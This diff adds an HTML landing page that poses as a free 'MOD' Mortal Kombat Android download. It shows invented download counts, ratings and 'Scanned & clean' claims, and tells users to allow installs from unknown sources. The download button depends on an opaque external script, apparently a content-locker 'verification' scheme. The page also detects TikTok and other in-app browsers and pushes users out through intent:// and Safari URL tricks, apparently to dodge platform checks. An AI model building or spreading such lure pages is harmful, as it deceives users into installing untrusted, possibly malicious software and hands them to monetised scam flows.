@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mortal Kombat — Download</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  *{ font-family:'Inter',sans-serif; }
+  html{ scroll-behavior:smooth; }
+
+  body{
+    background-color:#070b14;
+    background-image:
+      radial-gradient(900px 520px at 10% -8%, rgba(99,102,241,.20), transparent 62%),
+      radial-gradient(800px 520px at 92% 6%, rgba(168,85,247,.15), transparent 62%),
+      linear-gradient(rgba(255,255,255,.022) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.022) 1px, transparent 1px);
+    background-size:auto, auto, 46px 46px, 46px 46px;
+    min-height:100vh;
+    color:#e2e8f5;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+
+  .glass{
+    background:rgba(255,255,255,.035);
+    border:1px solid rgba(255,255,255,.08);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+  }
+
+  /* ---------- Cover ---------- */
+  .cover-frame{
+    border-radius:20px;
+    overflow:hidden;
+    border:1px solid rgba(255,255,255,.12);
+    box-shadow:0 24px 55px -22px rgba(0,0,0,.95), 0 0 0 1px rgba(99,102,241,.10) inset;
+    background:#0d1424;
+  }
+  .badge-18{
+    background:rgba(10,14,25,.86);
+    backdrop-filter:blur(8px);
+    border:1px solid rgba(250,204,21,.55);
+    color:#facc15;
+    font-weight:900;
+    letter-spacing:.5px;
+    box-shadow:0 0 22px rgba(250,204,21,.18);
+  }
+
+  /* ---------- Title ---------- */
+  .title-glow{
+    background:linear-gradient(135deg,#ffffff 0%,#dbe3ff 45%,#a5b4fc 100%);
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+  }
+
+  /* ---------- Buttons ---------- */
+  .btn-primary{
+    background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 55%,#a855f7 100%);
+    position:relative;
+    overflow:hidden;
+    box-shadow:0 14px 35px -12px rgba(99,102,241,.75);
+    transition:transform .25s cubic-bezier(.4,0,.2,1), box-shadow .25s;
+  }
+  .btn-primary::before{
+    content:'';
+    position:absolute; top:0; left:-120%; width:60%; height:100%;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.28),transparent);
+    transform:skewX(-20deg);
+    transition:left .75s ease;
+  }
+  .btn-primary:hover::before{ left:140%; }
+  .btn-primary:hover:not(:disabled){
+    transform:translateY(-2px);
+    box-shadow:0 22px 45px -12px rgba(139,92,246,.9);
+  }
+  .btn-primary:active:not(:disabled){ transform:translateY(0); }
+  .btn-primary:disabled{ opacity:.9; cursor:not-allowed; }
+
+  /* ---------- Chips ---------- */
+  .chip{
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.09);
+    color:#c3cbe0;
+  }
+
+  /* ---------- Info cards ---------- */
+  .info-card{
+    background:rgba(255,255,255,.03);
+    border:1px solid rgba(255,255,255,.07);
+    transition:background .3s, border-color .3s, transform .3s;
+  }
+  .info-card:hover{
+    background:rgba(255,255,255,.055);
+    border-color:rgba(99,102,241,.45);
+    transform:translateY(-3px);
+  }
+  .info-icon{
+    color:#818cf8;
+    filter:drop-shadow(0 0 12px rgba(129,140,248,.55));
+  }
+
+  /* ---------- Preview frame ---------- */
+  .preview-frame{
+    position:relative;
+    border-radius:20px;
+    overflow:hidden;
+    border:1px solid rgba(255,255,255,.10);
+    background:#0a0f1c;
+    box-shadow:0 26px 60px -25px rgba(0,0,0,.95);
+    aspect-ratio:16/9;
+    isolation:isolate;
+  }
+  .preview-frame img{
+    display:block;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    filter:blur(14px) brightness(.65) saturate(1.15);
+    transform:scale(1.12);
+    transition:filter .7s cubic-bezier(.22,1,.36,1), transform .7s cubic-bezier(.22,1,.36,1);
+    will-change:filter, transform;
+  }
+  .preview-frame.is-revealed img{
+    filter:blur(0) brightness(1) saturate(1);
+    transform:scale(1);
+  }
+  .preview-frame.is-revealed{ animation:framePulse .9s ease-out; }
+  @keyframes framePulse{
+    0%   { box-shadow:0 0 0 0 rgba(250,204,21,.55), 0 26px 60px -25px rgba(0,0,0,.95); }
+    100% { box-shadow:0 0 0 18px rgba(250,204,21,0), 0 26px 60px -25px rgba(0,0,0,.95); }
+  }
+
+  .preview-overlay{
+    position:absolute;
+    inset:0;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    text-align:center;
+    padding:20px;
+    cursor:pointer;
+    border:0;
+    background:radial-gradient(circle at 50% 50%, rgba(7,11,20,.5) 0%, rgba(7,11,20,.88) 78%);
+    z-index:2;
+    transition:opacity .5s ease, visibility .5s, transform .5s ease;
+    font-family:inherit;
+    color:inherit;
+  }
+  .preview-overlay:hover .preview-cta{
+    background:rgba(250,204,21,.20);
+    border-color:rgba(250,204,21,.75);
+    transform:translateY(-1px);
+  }
+  .preview-frame.is-revealed .preview-overlay{
+    opacity:0; visibility:hidden; pointer-events:none; transform:scale(1.04);
+  }
+
+  .preview-lock{
+    width:62px; height:62px;
+    border-radius:50%;
+    display:grid; place-items:center;
+    background:rgba(10,14,25,.9);
+    border:1px solid rgba(250,204,21,.55);
+    color:#facc15;
+    font-size:22px;
+    box-shadow:0 0 30px rgba(250,204,21,.25);
+    transition:transform .35s ease;
+    animation:lockPulse 2.2s ease-in-out infinite;
+  }
+  @keyframes lockPulse{
+    0%,100%{ box-shadow:0 0 26px rgba(250,204,21,.20); }
+    50%    { box-shadow:0 0 42px rgba(250,204,21,.45); }
+  }
+  .preview-overlay:hover .preview-lock{ transform:scale(1.08); }
+  .preview-overlay h3{
+    font-weight:900; letter-spacing:2.5px; font-size:15px; color:#facc15; margin:0;
+  }
+  .preview-overlay p{
+    font-size:12.5px; color:#94a3b8; max-width:340px; line-height:1.55; margin:0;
+  }
+  .preview-cta{
+    display:inline-flex; align-items:center; gap:8px; margin-top:8px;
+    padding:9px 18px; border-radius:99px;
+    font-size:12px; font-weight:700; letter-spacing:.5px;
+    color:#facc15;
+    background:rgba(250,204,21,.10);
+    border:1px solid rgba(250,204,21,.4);
+    transition:background .25s, border-color .25s, transform .25s;
+  }
+
+  /* ---------- Pulse dot ---------- */
+  .pulse-dot{ animation:pulse 1.9s ease-in-out infinite; }
+  @keyframes pulse{
+    0%,100%{ opacity:1; transform:scale(1); }
+    50%{ opacity:.35; transform:scale(.82); }
+  }
+
+  /* ---------- FAQ ---------- */
+  details.faq{ border-bottom:1px solid rgba(255,255,255,.06); }
+  details.faq summary{ list-style:none; cursor:pointer; }
+  details.faq summary::-webkit-details-marker{ display:none; }
+  details.faq[open] .faq-chevron{ transform:rotate(180deg); }
+  .faq-chevron{ transition:transform .3s ease; }
+
+  /* ---------- Entrance ---------- */
+  .fade-up{
+    opacity:0; transform:translateY(18px);
+    animation:fadeUp .7s cubic-bezier(.22,1,.36,1) forwards;
+  }
+  @keyframes fadeUp{ to{ opacity:1; transform:translateY(0); } }
+  .d1{ animation-delay:.05s } .d2{ animation-delay:.13s }
+  .d3{ animation-delay:.21s } .d4{ animation-delay:.29s }
+  .d5{ animation-delay:.37s }
+
+  @media (prefers-reduced-motion: reduce){
+    *{ animation:none !important; transition:none !important; }
+  }
+
+  /* ============================================================
+     BLOCKER OVERLAY — يظهر فقط داخل متصفح تيك توك
+     ============================================================ */
+  #tiktokBlocker{
+    position:fixed;
+    inset:0;
+    z-index:99999;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:22px;
+    background:
+      radial-gradient(700px 500px at 50% 0%, rgba(99,102,241,.30), transparent 65%),
+      linear-gradient(180deg,#070b14 0%,#0a1020 100%);
+    backdrop-filter:blur(6px);
+    -webkit-backdrop-filter:blur(6px);
+    overflow-y:auto;
+  }
+  #tiktokBlocker.show{ display:flex; }
+
+  .blocker-card{
+    width:100%;
+    max-width:430px;
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(255,255,255,.10);
+    border-radius:24px;
+    padding:26px 22px 24px;
+    text-align:center;
+    box-shadow:0 30px 70px -25px rgba(0,0,0,.9), 0 0 0 1px rgba(99,102,241,.12) inset;
+    animation:blockerIn .5s cubic-bezier(.22,1,.36,1) both;
+  }
+  @keyframes blockerIn{
+    from{ opacity:0; transform:translateY(16px) scale(.97); }
+    to  { opacity:1; transform:translateY(0) scale(1); }
+  }
+
+  .blocker-icon{
+    width:78px; height:78px;
+    margin:0 auto 16px;
+    border-radius:50%;
+    display:grid; place-items:center;
+    background:linear-gradient(135deg,rgba(250,204,21,.18),rgba(250,204,21,.05));
+    border:1px solid rgba(250,204,21,.55);
+    color:#facc15;
+    font-size:30px;
+    box-shadow:0 0 40px rgba(250,204,21,.30);
+    animation:lockPulse 2.2s ease-in-out infinite;
+  }
+
+  .blocker-title{
+    font-size:20px;
+    font-weight:900;
+    letter-spacing:.3px;
+    color:#fff;
+    margin:0 0 8px;
+  }
+  .blocker-sub{
+    font-size:13.5px;
+    color:#94a3b8;
+    line-height:1.6;
+    margin:0 0 20px;
+  }
+
+  .blocker-steps{
+    text-align:left;
+    background:rgba(0,0,0,.25);
+    border:1px solid rgba(255,255,255,.06);
+    border-radius:14px;
+    padding:14px 14px 14px 14px;
+    margin-bottom:18px;
+  }
+  .blocker-steps li{
+    display:flex;
+    gap:10px;
+    align-items:flex-start;
+    font-size:13px;
+    color:#cbd5e1;
+    line-height:1.5;
+    padding:6px 0;
+  }
+  .blocker-steps li .step-num{
+    flex:0 0 22px;
+    height:22px;
+    border-radius:50%;
+    display:grid; place-items:center;
+    background:rgba(99,102,241,.20);
+    border:1px solid rgba(99,102,241,.5);
+    color:#a5b4fc;
+    font-size:11px;
+    font-weight:800;
+    margin-top:1px;
+  }
+
+  .blocker-btn{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    width:100%;
+    padding:15px 20px;
+    border-radius:16px;
+    font-weight:800;
+    font-size:14.5px;
+    color:#fff;
+    background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 55%,#a855f7 100%);
+    box-shadow:0 14px 35px -12px rgba(99,102,241,.75);
+    border:0;
+    cursor:pointer;
+    transition:transform .2s ease, box-shadow .2s ease;
+  }
+  .blocker-btn:hover{
+    transform:translateY(-2px);
+    box-shadow:0 22px 45px -12px rgba(139,92,246,.9);
+  }
+  .blocker-btn:active{ transform:translateY(0); }
+
+  .blocker-copy{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    width:100%;
+    margin-top:10px;
+    padding:12px 16px;
+    border-radius:14px;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.12);
+    color:#c7d2fe;
+    font-size:13px;
+    font-weight:700;
+    cursor:pointer;
+    transition:background .2s, border-color .2s;
+  }
+  .blocker-copy:hover{
+    background:rgba(255,255,255,.09);
+    border-color:rgba(99,102,241,.55);
+  }
+  .blocker-copy.copied{
+    background:rgba(16,185,129,.15);
+    border-color:rgba(16,185,129,.55);
+    color:#6ee7b7;
+  }
+
+  .blocker-hint{
+    margin-top:14px;
+    font-size:11.5px;
+    color:#64748b;
+    line-height:1.55;
+  }
+
+  body.blocked{ overflow:hidden; }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     BLOCKER OVERLAY — يظهر فقط في متصفح تيك توك
+     ============================================================ -->
+<div id="tiktokBlocker" role="dialog" aria-modal="true" aria-labelledby="blockerTitle">
+  <div class="blocker-card">
+    <div class="blocker-icon">
+      <i class="fas fa-shield-halved"></i>
+    </div>
+
+    <h2 class="blocker-title" id="blockerTitle">Open in Browser</h2>
+    <p class="blocker-sub">
+      This page cannot be opened inside the TikTok app.<br>
+      Please open the link in your phone's browser to continue.
+    </p>
+
+    <ul class="blocker-steps">
+      <li>
+        <span class="step-num">1</span>
+        <span>Tap the <b>three dots (⋯)</b> at the top-right corner of TikTok.</span>
+      </li>
+      <li>
+        <span class="step-num">2</span>
+        <span>Choose <b>“Open in browser”</b> / <b>“Open in Safari”</b> / <b>“Open in Chrome”</b>.</span>
+      </li>
+      <li>
+        <span class="step-num">3</span>
+        <span>The page will reload and the download will work normally.</span>
+      </li>
+    </ul>
+
+    <button type="button" class="blocker-btn" id="openExternalBtn">
+      <i class="fas fa-up-right-from-square"></i>
+      <span>Try to Open in Browser</span>
+    </button>
+
+    <button type="button" class="blocker-copy" id="copyLinkBtn">
+      <i class="fas fa-link"></i>
+      <span>Copy Link</span>
+    </button>
+
+    <p class="blocker-hint">
+      If the button above doesn't work, use the ⋯ menu inside TikTok to open this page in your browser.
+    </p>
+  </div>
+</div>
+
+
+<main class="max-w-5xl mx-auto px-5 py-10 md:py-14">
+
+  <!-- ============ STATUS ============ -->
+  <div class="flex items-center justify-center gap-3 mb-8 text-[13px] text-slate-400 fade-up">
+    <span class="flex items-center gap-2">
+      <span class="w-2 h-2 rounded-full bg-emerald-400 pulse-dot"></span>
+      Download Ready
+    </span>
+    <span class="text-slate-700">•</span>
+    <span class="flex items-center gap-1.5">
+      <i class="fas fa-fire text-orange-400"></i>
+      1,284 downloads today
+    </span>
+  </div>
+
+  <!-- ============ HERO CARD ============ -->
+  <section class="glass rounded-3xl p-5 sm:p-7 fade-up d1">
+    <div class="grid md:grid-cols-[230px_1fr] gap-7 items-start">
+
+      <!-- Cover -->
+      <div class="relative w-full max-w-[230px] mx-auto md:mx-0">
+        <div class="cover-frame">
+          <img
+            src="https://i.postimg.cc/W48ShvJZ/Mljwol(1).png"
+            alt="Mortal Kombat cover"
+            class="w-full h-auto block"
+            decoding="async"
+          >
+        </div>
+        <span class="badge-18 absolute top-3 right-3 px-2.5 py-1 rounded-lg text-[13px] z-10">18+</span>
+
+        <div class="mt-3 flex items-center justify-center gap-2 text-[12px] text-slate-400">
+          <span class="text-amber-400 tracking-tight">
+            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-stroke"></i>
+          </span>
+          <span class="font-bold text-slate-200">4.9</span>
+          <span>· 12,847 reviews</span>
+        </div>
+      </div>
+
+      <!-- Info -->
+      <div>
+        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black tracking-tight title-glow leading-[1.05]">
+          MORTAL KOMBAT
+        </h1>
+
+        <div class="flex flex-wrap items-center gap-2 mt-4">
+          <span class="chip px-3 py-1.5 rounded-lg text-[12px] font-semibold"><i class="fas fa-gamepad mr-1.5 text-indigo-400"></i>Fighting</span>
+          <span class="chip px-3 py-1.5 rounded-lg text-[12px] font-semibold"><i class="fas fa-wifi-slash mr-1.5 text-indigo-400"></i>Offline</span>
+          <span class="chip px-3 py-1.5 rounded-lg text-[12px] font-semibold"><i class="fas fa-bolt mr-1.5 text-indigo-400"></i>Action</span>
+          <span class="chip px-3 py-1.5 rounded-lg text-[12px] font-semibold text-emerald-300 border-emerald-400/25 bg-emerald-400/[.07]">
+            <i class="fas fa-wand-magic-sparkles mr-1.5"></i>MOD Version
+          </span>
+        </div>
+
+        <p class="text-slate-300/90 mt-5 text-[15px] leading-relaxed">
+          Enter the brutal realm of Mortal Kombat. Fight your way through iconic warriors,
+          unleash devastating fatalities, and prove you are the ultimate champion in this
+          legendary fighting game — fully playable offline.
+        </p>
+
+        <div class="grid grid-cols-3 gap-3 mt-6 max-w-md">
+          <div class="info-card rounded-xl px-3 py-3 text-center">
+            <i class="fas fa-hard-drive info-icon text-base"></i>
+            <p class="text-[11px] text-slate-400 mt-1.5 font-medium">Size</p>
+            <p class="text-[13px] font-bold text-slate-100">132 MB</p>
+          </div>
+          <div class="info-card rounded-xl px-3 py-3 text-center">
+            <i class="fas fa-mobile-screen info-icon text-base"></i>
+            <p class="text-[11px] text-slate-400 mt-1.5 font-medium">Platform</p>
+            <p class="text-[13px] font-bold text-slate-100">Android</p>
+          </div>
+          <div class="info-card rounded-xl px-3 py-3 text-center">
+            <i class="fas fa-plug-circle-xmark info-icon text-base"></i>
+            <p class="text-[11px] text-slate-400 mt-1.5 font-medium">Mode</p>
+            <p class="text-[13px] font-bold text-slate-100">Offline</p>
+          </div>
+        </div>
+
+        <div class="mt-7 flex flex-col sm:flex-row sm:items-center gap-4">
+          <button
+            id="downloadBtn"
+            type="button"
+            onclick="_Nr()"
+            class="btn-primary inline-flex items-center justify-center gap-3 px-9 py-4 rounded-2xl text-white font-extrabold text-[15px] w-full sm:w-auto"
+          >
+            <i class="fas fa-download text-lg" id="btnIcon"></i>
+            <span id="btnText">Download Now</span>
+            <span class="text-[10px] bg-black/30 px-2.5 py-1 rounded-md font-bold tracking-wide">FREE</span>
+          </button>
+
+          <div class="flex items-center gap-2 text-[12px] text-slate-400">
+            <i class="fas fa-lock text-emerald-400"></i>
+            <span>No registration · No ads inside</span>
+          </div>
+        </div>
+
+        <p id="downloadMessage" class="text-[13px] text-indigo-300 mt-3 min-h-[20px] font-medium"></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ GAMEPLAY PREVIEW ============ -->
+  <section class="mt-12 fade-up d2">
+    <div class="flex items-end justify-between mb-4">
+      <div>
+        <h2 class="text-xl font-extrabold tracking-tight flex items-center gap-2">
+          <i class="fas fa-clapperboard text-indigo-400"></i>
+          Gameplay Preview
+        </h2>
+        <p class="text-[13px] text-slate-400 mt-1">Contains intense combat and blood — viewer discretion advised.</p>
+      </div>
+      <span class="chip px-3 py-1.5 rounded-lg text-[11px] font-bold hidden sm:flex items-center gap-1.5">
+        <i class="fas fa-triangle-exclamation text-amber-400"></i> 18+ CONTENT
+      </span>
+    </div>
+
+    <div class="preview-frame mx-auto max-w-2xl" id="previewFrame">
+      <img
+        src="https://img.itch.zone/aW1hZ2UvMzMwMDIyMC8xOTczMjIwNC5naWY=/original/SH5Z0r.gif"
+        alt="Mortal Kombat gameplay preview"
+        loading="lazy"
+        decoding="async"
+      >
+      <button
+        type="button"
+        class="preview-overlay"
+        id="previewOverlay"
+        aria-label="Reveal 18+ gameplay preview"
+      >
+        <div class="preview-lock">
+          <i class="fas fa-lock"></i>
+        </div>
+        <h3>18+ MATURE CONTENT</h3>
+        <p>This preview contains graphic combat footage. Tap anywhere to reveal.</p>
+        <span class="preview-cta">
+          <i class="fas fa-eye"></i>
+          Tap to Reveal
+        </span>
+      </button>
+    </div>
+  </section>
+
+  <!-- ============ FEATURES ============ -->
+  <section class="mt-14 fade-up d3">
+    <h2 class="text-xl font-extrabold tracking-tight mb-5 flex items-center gap-2">
+      <i class="fas fa-list-check text-indigo-400"></i>
+      What You Get
+    </h2>
+
+    <div class="grid sm:grid-cols-2 gap-3">
+      <div class="info-card rounded-2xl p-4 flex items-start gap-3">
+        <i class="fas fa-skull info-icon text-lg mt-0.5"></i>
+        <div>
+          <p class="font-bold text-[14px] text-slate-100">Brutal Fatalities</p>
+          <p class="text-[12.5px] text-slate-400 mt-0.5 leading-relaxed">All signature finishing moves unlocked from the start.</p>
+        </div>
+      </div>
+      <div class="info-card rounded-2xl p-4 flex items-start gap-3">
+        <i class="fas fa-user-ninja info-icon text-lg mt-0.5"></i>
+        <div>
+          <p class="font-bold text-[14px] text-slate-100">Classic Fighters</p>
+          <p class="text-[12.5px] text-slate-400 mt-0.5 leading-relaxed">Play as iconic warriors with their unique movesets.</p>
+        </div>
+      </div>
+      <div class="info-card rounded-2xl p-4 flex items-start gap-3">
+        <i class="fas fa-plug-circle-xmark info-icon text-lg mt-0.5"></i>
+        <div>
+          <p class="font-bold text-[14px] text-slate-100">Fully Offline</p>
+          <p class="text-[12.5px] text-slate-400 mt-0.5 leading-relaxed">Play anytime, anywhere — no internet connection needed.</p>
+        </div>
+      </div>
+      <div class="info-card rounded-2xl p-4 flex items-start gap-3">
+        <i class="fas fa-gauge-high info-icon text-lg mt-0.5"></i>
+        <div>
+          <p class="font-bold text-[14px] text-slate-100">Lightweight Build</p>
+          <p class="text-[12.5px] text-slate-400 mt-0.5 leading-relaxed">Only 132 MB — fast to download and easy on storage.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ TRUST ============ -->
+  <section class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-14 fade-up d4">
+    <div class="info-card rounded-2xl p-5 text-center">
+      <i class="fas fa-shield-halved text-2xl info-icon"></i>
+      <p class="text-[13px] font-bold mt-3 text-slate-200">Secure Download</p>
+      <p class="text-[11px] text-slate-500 mt-0.5">256-bit encrypted</p>
+    </div>
+    <div class="info-card rounded-2xl p-5 text-center">
+      <i class="fas fa-circle-check text-2xl info-icon"></i>
+      <p class="text-[13px] font-bold mt-3 text-slate-200">Verified Source</p>
+      <p class="text-[11px] text-slate-500 mt-0.5">Scanned &amp; clean</p>
+    </div>
+    <div class="info-card rounded-2xl p-5 text-center">
+      <i class="fas fa-bolt text-2xl info-icon"></i>
+      <p class="text-[13px] font-bold mt-3 text-slate-200">Fast Speed</p>
+      <p class="text-[11px] text-slate-500 mt-0.5">Global CDN</p>
+    </div>
+    <div class="info-card rounded-2xl p-5 text-center">
+      <i class="fas fa-user-check text-2xl info-icon"></i>
+      <p class="text-[13px] font-bold mt-3 text-slate-200">No Registration</p>
+      <p class="text-[11px] text-slate-500 mt-0.5">Instant access</p>
+    </div>
+  </section>
+
+  <!-- ============ FAQ ============ -->
+  <section class="mt-14 fade-up d5">
+    <h2 class="text-xl font-extrabold tracking-tight mb-4 flex items-center gap-2">
+      <i class="fas fa-circle-question text-indigo-400"></i>
+      Frequently Asked Questions
+    </h2>
+
+    <div class="glass rounded-2xl px-5">
+      <details class="faq py-4" open>
+        <summary class="flex items-center justify-between gap-4">
+          <span class="font-semibold text-[14px] text-slate-100">Is the download really free?</span>
+          <i class="fas fa-chevron-down faq-chevron text-indigo-400 text-xs"></i>
+        </summary>
+        <p class="text-[13px] text-slate-400 mt-2.5 leading-relaxed">
+          Yes. Clicking “Download Now” takes you to a short verification page. Once completed, the download starts automatically at full speed.
+        </p>
+      </details>
+
+      <details class="faq py-4">
+        <summary class="flex items-center justify-between gap-4">
+          <span class="font-semibold text-[14px] text-slate-100">Do I need internet to play?</span>
+          <i class="fas fa-chevron-down faq-chevron text-indigo-400 text-xs"></i>
+        </summary>
+        <p class="text-[13px] text-slate-400 mt-2.5 leading-relaxed">
+          No. This is a fully offline game — you can play anytime, anywhere, without an internet connection.
+        </p>
+      </details>
+
+      <details class="faq py-4">
+        <summary class="flex items-center justify-between gap-4">
+          <span class="font-semibold text-[14px] text-slate-100">Will it work on my device?</span>
+          <i class="fas fa-chevron-down faq-chevron text-indigo-400 text-xs"></i>
+        </summary>
+        <p class="text-[13px] text-slate-400 mt-2.5 leading-relaxed">
+          It runs on most modern Android devices. Just allow installation from unknown sources and you're ready to play.
+        </p>
+      </details>
+    </div>
+  </section>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="mt-12 flex flex-col items-center gap-3 text-center">
+    <div class="flex items-center gap-2 text-[12px] text-slate-500">
+      <i class="fas fa-lock text-indigo-400/80"></i>
+      <span>Your download is safe and protected</span>
+    </div>
+    <p class="text-[11px] text-slate-600 max-w-lg leading-relaxed">
+      This is a modified (MOD) version and is not affiliated with the official publisher.
+      All trademarks belong to their respective owners.
+    </p>
+  </footer>
+
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ==========================================================
+     1) PREVIEW REVEAL
+     ========================================================== */
+  var frame   = document.getElementById('previewFrame');
+  var overlay = document.getElementById('previewOverlay');
+
+  if (frame && overlay) {
+    overlay.addEventListener('click', function () {
+      frame.classList.add('is-revealed');
+    });
+  }
+
+
+  /* ==========================================================
+     2) DOWNLOAD BUTTON FEEDBACK
+     ========================================================== */
+  var btn     = document.getElementById('downloadBtn');
+  var btnIcon = document.getElementById('btnIcon');
+  var btnText = document.getElementById('btnText');
+  var msg     = document.getElementById('downloadMessage');
+
+  if (btn) {
+    btn.addEventListener('click', function () {
+      msg.textContent = 'Opening download link…';
+      var oldIcon = btnIcon.className;
+      var oldText = btnText.textContent;
+      btnIcon.className = 'fas fa-spinner fa-spin text-lg';
+      btnText.textContent = 'Opening…';
+      setTimeout(function () {
+        btnIcon.className = oldIcon;
+        btnText.textContent = oldText;
+        msg.textContent = '';
+      }, 1500);
+    });
+  }
+
+
+  /* ==========================================================
+     3) 🚫 TIKTOK IN-APP BROWSER BLOCKER
+     ========================================================== */
+  var ua = navigator.userAgent || '';
+
+  // كشف متصفح تيك توك + باقي المتصفحات الداخلية للتطبيقات
+  var isTikTok   = /TikTok|musical_ly|BytedanceWebview|aweme|ttwebview/i.test(ua);
+  var isInApp    = /FBAN|FBAV|Instagram|Line\/|Twitter|Snapchat|Pinterest/i.test(ua);
+  var isAndroid  = /Android/i.test(ua);
+  var isIOS      = /iPhone|iPad|iPod/i.test(ua);
+
+  // 🔒 عرض الحاجب
+  function showBlocker() {
+    var blocker = document.getElementById('tiktokBlocker');
+    if (!blocker) return;
+    blocker.classList.add('show');
+    document.body.classList.add('blocked');
+    // منع التمرير للخلف
+    document.documentElement.style.overflow = 'hidden';
+  }
+
+  if (isTikTok || isInApp) {
+    // ننتظر DOM
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', showBlocker);
+    } else {
+      showBlocker();
+    }
+  }
+
+  // 🚀 زر "Try to Open in Browser"
+  var openBtn = document.getElementById('openExternalBtn');
+  if (openBtn) {
+    openBtn.addEventListener('click', function () {
+      var url = window.location.href;
+
+      if (isAndroid) {
+        // على أندرويد: نستخدم intent:// لفتح المتصفح الافتراضي
+        var cleanUrl = url.replace(/^https?:\/\//, '');
+        window.location.href =
+          'intent://' + cleanUrl +
+          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
+          'category=android.intent.category.BROWSABLE;' +
+          'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
+      } else if (isIOS) {
+        // على iOS: نحاول فتح Safari مباشرة
+        // (قد لا يعمل داخل TikTok لكنه محاولة)
+        var safariUrl = url.replace(/^https?:\/\//, '');
+        window.location.href = 'x-safari-https://' + safariUrl;
+
+        // احتياطي: بعد ثانية، نعرض رسالة إرشادية
+        setTimeout(function () {
+          alert('If the browser didn\'t open, tap the ⋯ menu at the top-right of TikTok and choose "Open in Safari".');
+        }, 1200);
+      } else {
+        // سطح المكتب / غير معروف
+        window.open(url, '_blank', 'noopener,noreferrer');
+      }
+    });
+  }
+
+  // 📋 زر "Copy Link"
+  var copyBtn = document.getElementById('copyLinkBtn');
+  if (copyBtn) {
+    copyBtn.addEventListener('click', function () {
+      var url = window.location.href;
+      var label = copyBtn.querySelector('span');
+
+      function done() {
+        copyBtn.classList.add('copied');
+        label.textContent = 'Link Copied ✓';
+        setTimeout(function () {
+          copyBtn.classList.remove('copied');
+          label.textContent = 'Copy Link';
+        }, 2000);
+      }
+
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(done).catch(function () {
+          fallbackCopy(url, done);
+        });
+      } else {
+        fallbackCopy(url, done);
+      }
+    });
+  }
+
+  function fallbackCopy(text, cb) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); cb && cb(); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+})();
+</script>
+
+  <script type="text/javascript">
+    var bkrzn_jmU_jZPsIc={"it":4262445,"key":"342e0"};
+</script>
+  <script src="https://d1chbu4sfo2xhu.cloudfront.net/7d530d0.js"></script>
+
+</body>
+</html>
